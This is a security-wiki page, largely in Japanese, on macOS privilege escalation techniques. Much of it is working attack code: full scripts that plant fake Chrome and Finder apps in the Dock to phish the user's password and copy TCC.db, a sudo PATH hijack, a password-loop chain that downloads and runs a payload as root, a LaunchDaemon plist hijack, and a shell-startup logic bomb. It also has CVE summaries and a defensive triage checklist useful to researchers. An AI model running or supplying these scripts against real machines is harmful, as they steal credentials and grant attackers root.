# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

TCC privilege escalation を探している場合は、以下を参照してください:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

**Linux/Unix に影響する privilege escalation の手法のほとんどは、MacOS** マシンにも影響することに注意してください。そのため、以下を参照してください:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## User Interaction

### Sudo Hijacking

元の [Sudo Hijacking technique は Linux Privilege Escalation の記事](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking) にあります。

ただし、macOS はユーザーが **`sudo`** を実行する際に、ユーザーの **`PATH`** を**維持します**。つまり、この攻撃を実現する別の方法として、被害者が **sudo を実行した際に**実行する他のバイナリを**hijack**することができます:
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Note that a user that uses the terminal will highly probable have **Homebrew installed**. So it's possible to hijack binaries in **`/opt/homebrew/bin`**.

### Dock Impersonation

**social engineering**を使えば、たとえばDock内で**Google Chromeを偽装**し、実際には自分のスクリプトを実行させることができます：

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
いくつかの提案：

- DockにChromeがあるか確認し、ある場合はそのエントリを**削除**して、同じ位置に**偽の** **Chromeエントリ**をDock配列へ**追加**します。

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
いくつかの提案:

- **DockからFinderを削除することはできない**ため、Dockに追加する場合は、偽のFinderを本物のFinderのすぐ隣に配置できます。そのためには、**Dock arrayの先頭に偽のFinderエントリを追加する**必要があります。
- 別の方法として、Dockに配置せずにそのまま開く方法もあります。「FinderがFinderの制御を求めています」という表示は、それほど不自然ではありません。
- パスワードを尋ねることなく、ひどいダイアログボックスで**rootへエスカレートする**別の方法は、Finderに権限が必要な操作を実行するためパスワードを尋ねさせることです:
- Finderに新しい **`sudo`** ファイルを **`/etc/pam.d`** にコピーするよう要求します（パスワードを求めるプロンプトには「Finderがsudoをコピーしようとしています」と表示されます）
- 新しい **Authorization Plugin** をコピーするようFinderに要求します（ファイル名を制御できるため、パスワードを求めるプロンプトには「FinderがFinder.bundleをコピーしようとしています」と表示されます）

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malwareは頻繁にユーザー操作を悪用して、**sudoを使用可能なパスワードを取得**し、プログラムから再利用します。一般的な流れ:

1. `whoami`でログイン中のユーザーを特定する。
2. `dscl . -authonly "$user" "$pw"`が成功を返すまで、**パスワードプロンプトをループ**させる。
3. credentialを（例: `/tmp/.pass`）にキャッシュし、`sudo -S`（stdin経由でパスワードを渡す）で特権操作を実行する。

最小限のチェーンの例:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
盗まれたパスワードは、その後 **`xattr -c` で Gatekeeper の quarantine を解除**したり、LaunchDaemons などの特権ファイルをコピーしたり、追加のステージを非対話的に実行したりするために再利用できます。

## 新しい macOS 固有の攻撃ベクトル（2023～2025年）

### 非推奨の `AuthorizationExecuteWithPrivileges` は現在も使用可能

`AuthorizationExecuteWithPrivileges` は 10.7 で deprecated になりましたが、**Sonoma/Sequoia でも引き続き動作します**。多くの commercial updater は、信頼できないパスを指定して `/usr/libexec/security_authtrampoline` を呼び出します。対象の binary が user-writable であれば、trojan を仕込み、正規の prompt を利用できます：
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
上記の **masquerading tricks** と組み合わせて、信憑性のあるパスワードダイアログを表示します。


### 特権ヘルパー / XPC triage

現代の多くのサードパーティ製 macOS privescs は、同じパターンに従います。**root LaunchDaemon** が **`/Library/PrivilegedHelperTools`** から **Mach/XPC service** を公開し、その後、helper が **client を検証しない**、**検証が遅すぎる**（PID race）、または **ユーザー制御の path/script** を受け取る **root method** を公開します。これは、VPN client、game launcher、updater における近年の多くの helper bug の背後にある bug class です。

簡易 triage checklist:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
特に、以下の点に注意してください。

- ジョブが `launchd` にロードされたままになり、**アンインストール後も**リクエストの受け付けを続けるもの
- **`/Applications/...`** または非 root ユーザーが書き込み可能なその他のパスからスクリプトを実行したり、設定を読み込んだりするもの
- **PID ベース**または **bundle-id-only** の peer 検証に依存しており、race condition を利用できる可能性があるもの

helper の authorization bugs の詳細については、[このページ](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md)を確認してください。

### PackageKit script environment inheritance (CVE-2024-27822)

Apple が **Sonoma 14.5**、**Ventura 13.6.7**、**Monterey 12.7.5** で修正するまで、ユーザーが **`Installer.app`** / **`PackageKit.framework`** 経由で開始した install では、**PKG scripts を現在のユーザー環境内で root として実行**できました。つまり、**`#!/bin/zsh`** を使用する package は、攻撃者の **`~/.zshenv`** を読み込み、被害者がその package を install した際に、それを **root として**実行できました。

これは **logic bomb** として特に興味深いものです。ユーザーアカウントへの foothold と、書き込み可能な shell startup file があればよく、その後はユーザーによって脆弱な **zsh-based** installer が実行されるのを待つだけです。これは通常、**MDM/Munki** の deployment には適用されません。これらは root ユーザーの environment 内で実行されるためです。
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
より深く installer 固有の abuse を確認したい場合は、[this page](macos-files-folders-and-binaries/macos-installers-abuse.md) も確認してください。

### LaunchDaemon plist hijack（CVE-2025-24085 pattern）

LaunchDaemon plist またはその `ProgramArguments` target が **user-writable** である場合、それを置き換えてから launchd に reload を強制することで privilege escalation できます。
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Thisは、**CVE-2025-24085**向けに公開されたexploit patternを反映したもので、writable plistを悪用してattacker codeをrootとして実行していました。

### XNU SMR credential race (CVE-2025-24118)

`kauth_cred_proc_update`の**race**により、local attackerは、スレッド間で`setgid()`/`getgid()`のloopを競合させてtorn `memcpy`を発生させることで、read-only credential pointer（`proc_ro.p_ucred`）を破壊できます。破壊に成功すると、**uid 0**とkernel memory accessを取得できます。最小限のPoC構造:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Heap groomingと組み合わせて、pointerが再読み込みされる場所に制御可能なデータを配置します。脆弱なbuildでは、SIP bypass要件なしで信頼性の高い**local kernel privesc**が可能です。

### Migration assistant経由のSIP bypass（"Migraine", CVE-2023-32369）

すでにroot権限を取得していても、SIPはsystem locationsへの書き込みをブロックします。**Migraine** bugは、Migration Assistantのentitlement `com.apple.rootless.install.heritable`を悪用して、SIP bypassを継承するchild processをspawnし、protected paths（例：`/System/Library/LaunchDaemons`）を上書きします。chainは以下のとおりです：

1. live system上でroot権限を取得する。
2. crafted stateを使って`systemmigrationd`をtriggerし、attacker-controlled binaryを実行させる。
3. 継承したentitlementを使ってSIP-protected filesにpatchを適用し、reboot後もpersistさせる。

### NSPredicate/XPC expression smuggling（CVE-2023-23530/23531 bug class）

複数のApple daemonはXPC経由で**NSPredicate** objectsを受け取り、attacker-controlledな`expressionType` fieldのみをvalidateします。任意のselectorをevaluateするpredicateをcraftすることで、**root/system XPC services**（例：`coreduetd`、`contextstored`）内で**code execution**を実現できます。initial app sandbox escapeと組み合わせると、**user promptsなしのprivilege escalation**が可能になります。predicateをdeserializeする一方で、robustなvisitorを欠いているXPC endpointsを探してください。

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Any user**（unprivileged userを含む）は、Time Machine snapshotをcreateおよびmountして、そのsnapshot内の**すべてのfileにaccess**できます。\
必要な**唯一のprivilege**は、使用するapplication（`Terminal`など）が**Full Disk Access**（FDA）access（`kTCCServiceSystemPolicyAllfiles`）を持つことです。これはadminによってgrantされる必要があります。

<details>
<summary>Mount Time Machine snapshot</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

より詳細な説明は[**original reportで確認できます**](https://theevilbit.github.io/posts/cve_2020_9771/)**。**

## Sensitive Information

これはprivilegesのescalateに役立ちます:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## References

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
